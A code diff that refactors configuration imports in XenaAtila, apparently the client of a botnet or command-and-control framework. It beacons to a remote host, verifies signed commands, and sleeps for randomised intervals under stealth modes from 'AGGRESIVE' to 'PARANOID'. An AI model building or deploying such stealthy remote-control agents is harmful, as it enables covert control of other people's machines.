@@ -3,14 +3,13 @@ import logging
 import jwcrypto.jwk as jwk
 import jwcrypto.jwt as jwt
 
+from env import XENA_ATILA_HOST, TRUSTED_PUBLIC_KEY, STEALTH
 from time import sleep
-from env import Env
 from requests import post, get
 from uuid import uuid4
 from typing import Union
 from Crypto.PublicKey import RSA
 from random import randint
-
 from services.system import System
 from domains.message import Message
 
@@ -24,7 +23,7 @@ class XenaAtila:
   def __init__(self):
     logging.debug('Unique identifier at ' + client_id)
 
-    self.remote = Env()['XENA_ATILA_HOST']
+    self.remote = XENA_ATILA_HOST
 
     # Identify to the Atila.
     while True:
@@ -63,7 +62,7 @@ class XenaAtila:
 
       # Verify and decode the message.
       try:
-        receivedToken = jwt.JWT(key = jwk.JWK.from_pem(Env()['MASTER_PUBLIC_KEY']), jwt = message.content)
+        receivedToken = jwt.JWT(key = jwk.JWK.from_pem(TRUSTED_PUBLIC_KEY), jwt = message.content)
         content = json.loads(receivedToken.claims)
       except Exception as e:
         logging.warning('Unable to verify the token.' + str(e))
@@ -158,15 +157,15 @@ class XenaAtila:
   
   def sleep(self):
     amount = 0
-    if Env()['STEALTH'] == 'AGGRESIVE':
+    if STEALTH == 'AGGRESIVE':
       amount = 10
-    if Env()['STEALTH'] == 'PUSHY':
+    if STEALTH == 'PUSHY':
       amount = randint(600, 1000)
-    if Env()['STEALTH'] == 'NORMAL':
+    if STEALTH == 'NORMAL':
       amount = randint(3600, 7200)
-    if Env()['STEALTH'] == 'SNEAKY':
+    if STEALTH == 'SNEAKY':
       amount = randint(7200, 28800)
-    if Env()['STEALTH'] == 'PARANOID':
+    if STEALTH == 'PARANOID':
       amount = randint(28800, 129600)
     sleep(amount)
 
